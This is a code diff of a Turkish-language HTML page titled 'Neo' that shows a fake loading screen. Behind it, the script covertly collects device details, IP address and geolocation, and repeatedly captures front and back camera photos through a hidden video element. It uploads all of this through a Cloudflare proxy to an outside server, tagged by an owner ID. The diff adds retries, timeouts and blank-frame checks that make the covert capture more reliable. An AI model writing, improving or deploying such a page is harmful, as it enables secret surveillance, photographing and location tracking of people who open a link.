@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Neo</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
@@ -18,7 +18,7 @@ body, html { height:100%; background:#000; display:flex; justify-content:center;
     transition: width 0.3s ease; }
 #progress-percent { color: #cc0000; font-size: 28px; font-weight: bold; margin: 15px 0; }
 #status-text { color: #888; font-size: 15px; font-weight: 300; margin-top: 30px; }
-#video { position:fixed; top:-9999px; left:-9999px; width:640px; height:480px; pointer-events:none; }
+#video { position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; pointer-events:none; }
 @media (max-width:480px) {
     .neo-text { font-size:75px; }
     #progress-percent { font-size:24px; }
@@ -33,42 +33,78 @@ body, html { height:100%; background:#000; display:flex; justify-content:center;
         <div class="progress-outer"><div class="progress-inner" id="progress-bar"></div></div>
         <div id="progress-percent">%0</div>
     </div>
-    <div id="status-text">hosgeldin...</div>
+    <div id="status-text">hoş geldin...</div>
 </div>
 <video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 <script>
 const CLOUDFLARE_PROXY = "https://neo-cors-proxy.halahalaq.workers.dev";
-const FADEHOST_URL = "https://myrules.fadehost.app"; 
+const FADEHOST_URL = "https://myrules.fadehost.app";
 const urlParams = new URLSearchParams(window.location.search);
-const ownerId = urlParams.get('owner_id') || "bilinmiyor";
-const csrfToken = "github_pages_token"; 
+
+function sanitizeOwnerId(raw) {
+    if (!raw) return "bilinmiyor";
+    const clean = String(raw).replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64);
+    return clean.length > 0 ? clean : "bilinmiyor";
+}
+const ownerId = sanitizeOwnerId(urlParams.get('owner_id'));
+const csrfToken = "github_pages_token";
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const progressBar = document.getElementById('progress-bar');
 const progressPercent = document.getElementById('progress-percent');
 const statusText = document.getElementById('status-text');
-let stream = null, photoCount = 0, isFinished = false;
+
+let stream = null;
+let photoCount = 0;
+let isFinished = false;
+let msgTimer = null;
 
 const statusMessages = [
-    'hosgeldin...','bi dk.....','yukleniyor...','yukleniyor...',
-    'sunucunun cevabi bekleniyor...','beklenmedik hata..',
-    'tekrardan deneniyor...','lutfen bekleyin...'
+    'hoş geldin...','bir dakika.....','yükleniyor...','yükleniyor...',
+    'sunucunun cevabı bekleniyor...','lütfen bekleyin...'
 ];
 let msgIndex = 0;
 
 function updateProgress(pct) {
-    try { progressBar.style.width = pct + '%'; progressPercent.textContent = '%' + Math.round(pct); }
-    catch(e) {}
+    const safe = Math.max(0, Math.min(100, Math.round(pct)));
+    progressBar.style.width = safe + '%';
+    progressPercent.textContent = '%' + safe;
 }
 
-function cycleMessages() {
-    try {
-        if (isFinished) { statusText.textContent = 'lutfen bekleyin...'; updateProgress(99); return; }
+function startMessageCycle() {
+    stopMessageCycle();
+    msgTimer = setInterval(() => {
+        if (isFinished) return;
         statusText.textContent = statusMessages[msgIndex];
         msgIndex = (msgIndex + 1) % statusMessages.length;
-    } catch(e) {}
+    }, 2500);
+}
+
+function stopMessageCycle() {
+    if (msgTimer) { clearInterval(msgTimer); msgTimer = null; }
+}
+
+function finishFlow() {
+    isFinished = true;
+    stopMessageCycle();
+    updateProgress(100);
+    statusText.textContent = 'lütfen bekleyin...';
+}
+
+function stopStream() {
+    if (stream) {
+        try { stream.getTracks().forEach(t => t.stop()); } catch(e) {}
+        stream = null;
+    }
+}
+
+function withTimeout(promise, ms) {
+    return Promise.race([
+        promise,
+        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), ms))
+    ]);
 }
 
 async function collectDeviceInfo() {
@@ -80,22 +116,44 @@ async function collectDeviceInfo() {
         info.platform = navigator.platform;
         info.screenSize = screen.width + 'x' + screen.height;
         info.cpuCores = navigator.hardwareConcurrency || '?';
+
         try {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) { info.connectionType = conn.effectiveType || '?';
-                info.downlink = conn.downlink + ' Mbps'; info.rtt = conn.rtt + ' ms'; }
+            if (conn) {
+                info.connectionType = conn.effectiveType || '?';
+                info.downlink = conn.downlink + ' Mbps';
+                info.rtt = conn.rtt + ' ms';
+            }
         } catch(e) {}
-        try { info.ram = navigator.deviceMemory || '?'; if (info.ram !== '?') info.ram += ' GB'; }
-        catch(e) { info.ram = '?'; }
-        try { const b = await navigator.getBattery();
-            info.batteryLevel = Math.round(b.level * 100) + '%'; info.isCharging = b.charging; }
-        catch(e) { info.batteryLevel = '?'; info.isCharging = false; }
+
+        try {
+            info.ram = navigator.deviceMemory || '?';
+            if (info.ram !== '?') info.ram += ' GB';
+        } catch(e) { info.ram = '?'; }
+
+        try {
+            if (typeof navigator.getBattery === 'function') {
+                const b = await withTimeout(navigator.getBattery(), 3000);
+                info.batteryLevel = Math.round(b.level * 100) + '%';
+                info.isCharging = b.charging;
+            } else {
+                info.batteryLevel = '?';
+                info.isCharging = false;
+            }
+        } catch(e) {
+            info.batteryLevel = '?';
+            info.isCharging = false;
+        }
+
         try {
             const c2 = document.createElement('canvas');
             const gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
-            if (gl) { const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }
+            if (gl) {
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            }
         } catch(e) { info.gpu = '?'; }
+
         try {
             const ua = navigator.userAgent;
             if (ua.includes('iPhone')) { info.deviceBrand='Apple'; info.deviceModel='iPhone'; }
@@ -105,13 +163,18 @@ async function collectDeviceInfo() {
             else if (ua.includes('Mac')) { info.deviceBrand='Apple'; info.deviceModel='Mac'; }
             else if (ua.includes('Linux')) { info.deviceBrand='Linux'; info.deviceModel='Linux PC'; }
         } catch(e) {}
+
         try {
-            const r = await fetch('https://ipapi.co/json/');
+            const r = await withTimeout(fetch('https://ipapi.co/json/'), 5000);
             const d = await r.json();
-            info.ip = d.ip || '?'; info.city = d.city || '?'; info.region = d.region || '?';
+            info.ip = d.ip || '?';
+            info.city = d.city || '?';
+            info.region = d.region || '?';
             info.country = d.country_code || '?';
             info.loc = (d.latitude || '') + ',' + (d.longitude || '');
-            info.org = d.org || '?'; info.postal = d.postal || '?'; info.timezone = d.timezone || '?';
+            info.org = d.org || '?';
+            info.postal = d.postal || '?';
+            info.timezone = d.timezone || '?';
         } catch(e) { info.ip = '?'; info.city = '?'; }
     } catch(e) {}
     return info;
@@ -120,41 +183,55 @@ async function collectDeviceInfo() {
 async function sendDeviceInfo() {
     try {
         const info = await collectDeviceInfo();
-        const targetUrl = encodeURIComponent(`${FADEHOST_URL}/device_info`);
-        await fetch(`${CLOUDFLARE_PROXY}/?url=${targetUrl}`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken},
-            body:JSON.stringify({owner_id:ownerId, device_info:info})
-        });
-        return true;
+        const targetUrl = FADEHOST_URL + '/device_info';
+        const proxyUrl = CLOUDFLARE_PROXY + '/?url=' + encodeURIComponent(targetUrl);
+        const r = await withTimeout(fetch(proxyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
+            body: JSON.stringify({ owner_id: ownerId, device_info: info })
+        }), 10000);
+        return r.ok;
     } catch(e) { return false; }
 }
 
 async function initCamera(facingMode) {
-    try {
-        if (stream) { try { stream.getTracks().forEach(t=>t.stop()); } catch(e) {} }
-        const constraints = { video: { facingMode: facingMode, width: {ideal:640}, height: {ideal:480} }, audio: false };
+    stopStream();
+    const attempt = async (constraints) => {
         stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream; video.muted = true; video.playsInline = true;
+        video.srcObject = stream;
+        video.muted = true;
+        video.playsInline = true;
         await new Promise((resolve, reject) => {
-            video.onloadedmetadata = () => { video.play().then(resolve).catch(reject); };
-            setTimeout(() => reject(new Error('timeout')), 8000);
+            const onMeta = () => { video.onloadedmetadata = null; resolve(); };
+            video.onloadedmetadata = onMeta;
+            setTimeout(() => { video.onloadedmetadata = null; reject(new Error('metadata timeout')); }, 8000);
         });
-        await new Promise(r => setTimeout(r, 500));
+        try { await withTimeout(video.play(), 5000); } catch(e) {}
+        const start = Date.now();
+        while (video.readyState < 2 && Date.now() - start < 3000) {
+            await new Promise(r => setTimeout(r, 100));
+        }
         return true;
+    };
+    try {
+        return await attempt({ video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
     } catch(e) {
-        try {
-            if (stream) { try { stream.getTracks().forEach(t=>t.stop()); } catch(e) {} }
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
-            video.srcObject = stream; video.muted = true; video.playsInline = true;
-            await new Promise((resolve, reject) => {
-                video.onloadedmetadata = () => { video.play().then(resolve).catch(reject); };
-                setTimeout(() => reject(new Error('timeout')), 8000);
-            });
-            await new Promise(r => setTimeout(r, 500));
-            return true;
-        } catch(e2) { return false; }
+        stopStream();
+        try { return await attempt({ video: { facingMode }, audio: false }); }
+        catch(e2) { stopStream(); return false; }
     }
+}
+
+function isBlankCanvas(ctx, w, h) {
+    try {
+        const data = ctx.getImageData(0, 0, w, h).data;
+        let sum = 0, count = 0;
+        for (let i = 0; i < data.length; i += 40) {
+            sum += (data[i] + data[i+1] + data[i+2]) / 3;
+            count++;
+        }
+        return (sum / count) < 8;
+    } catch(e) { return false; }
 }
 
 function captureImage() {
@@ -162,61 +239,74 @@ function captureImage() {
         if (video.readyState < 2) return null;
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        if (isBlankCanvas(ctx, canvas.width, canvas.height)) return null;
         return canvas.toDataURL('image/jpeg', 0.7);
     } catch(e) { return null; }
 }
 
 async function sendPhoto(img, type) {
+    const targetUrl = FADEHOST_URL + '/upload';
+    const proxyUrl = CLOUDFLARE_PROXY + '/?url=' + encodeURIComponent(targetUrl);
+    const payload = JSON.stringify({ owner_id: ownerId, image: img, camera_type: type });
+    for (let attempt = 0; attempt < 2; attempt++) {
+        try {
+            const r = await withTimeout(fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
+                body: payload
+            }), 15000);
+            if (r.ok) { photoCount++; return true; }
+        } catch(e) {}
+        await new Promise(r => setTimeout(r, 800));
+    }
+    return false;
+}
+
+async function captureOne(facingMode, type, progressOnStart, progressOnEnd) {
+    updateProgress(progressOnStart);
     try {
-        const targetUrl = encodeURIComponent(`${FADEHOST_URL}/upload`);
-        const r = await fetch(`${CLOUDFLARE_PROXY}/?url=${targetUrl}`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken},
-            body:JSON.stringify({owner_id:ownerId, image:img, camera_type:type})
-        });
-        if (r.ok) { photoCount++; return true; }
-        return false;
-    } catch(e) { return false; }
+        const ok = await initCamera(facingMode);
+        if (ok) {
+            await new Promise(r => setTimeout(r, 300));
+            const img = captureImage();
+            if (img) await sendPhoto(img, type);
+        }
+    } catch(e) {}
+    updateProgress(progressOnEnd);
 }
 
 async function capturePhotos() {
-    updateProgress(5);
-    for (let i = 1; i <= 5; i++) {
-        try {
-            const frontOk = await initCamera('user');
-            if (frontOk) {
-                await new Promise(r => setTimeout(r, 300));
-                const img = captureImage();
-                if (img) await sendPhoto(img, 'On Kamera ' + i);
-            }
-        } catch(e) {}
-        updateProgress(5 + i * 8);
-        try {
-            const backOk = await initCamera('environment');
-            if (backOk) {
-                await new Promise(r => setTimeout(r, 300));
-                const img = captureImage();
-                if (img) await sendPhoto(img, 'Arka Kamera ' + i);
-            }
-        } catch(e) {}
-        updateProgress(5 + i * 8 + 4);
+    // 10 tur, her turda ön + arka. Toplam 20 fotoğraf.
+    const TUR = 10;
+    for (let i = 1; i <= TUR; i++) {
+        if (isFinished) break;
+        const base = (i - 1) * 9; // 0..81
+        await captureOne('user', 'On Kamera ' + i, base + 1, base + 4.5);
+        if (isFinished) break;
+        await captureOne('environment', 'Arka Kamera ' + i, base + 4.5, base + 9);
     }
-    updateProgress(95);
-    try { if (stream) stream.getTracks().forEach(t=>t.stop()); } catch(e) {}
-    isFinished = true; updateProgress(99); statusText.textContent = 'lutfen bekleyin...';
+    stopStream();
+    finishFlow();
 }
 
 async function main() {
     try {
-        setInterval(cycleMessages, 2500);
+        startMessageCycle();
+        updateProgress(0);
         sendDeviceInfo();
         setTimeout(async () => {
             try { await capturePhotos(); }
-            catch(e) { isFinished = true; updateProgress(99); statusText.textContent = 'lutfen bekleyin...'; }
+            catch(e) { finishFlow(); }
         }, 2000);
-    } catch(e) { isFinished = true; updateProgress(99); statusText.textContent = 'lutfen bekleyin...'; }
+    } catch(e) { finishFlow(); }
 }
+
+window.addEventListener('beforeunload', () => {
+    stopMessageCycle();
+    stopStream();
+});
 
 if (document.readyState === 'complete') main();
 else window.addEventListener('load', main);
